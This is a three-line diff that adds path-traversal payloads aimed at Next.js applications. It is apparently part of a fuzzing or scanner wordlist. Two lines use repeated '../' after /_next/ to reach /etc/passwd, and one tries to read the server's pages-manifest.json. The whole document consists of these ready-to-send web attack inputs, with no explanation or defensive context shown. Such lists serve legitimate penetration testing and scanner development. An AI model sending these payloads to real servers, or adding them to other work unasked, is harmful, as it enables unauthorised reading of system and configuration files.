@@ -1,0 +1,3 @@
+/_next/../../../../../../../../../../etc/passwd
+/_next/../../../../../../../../../etc/passwd
+/_next/static/../server/pages-manifest.json
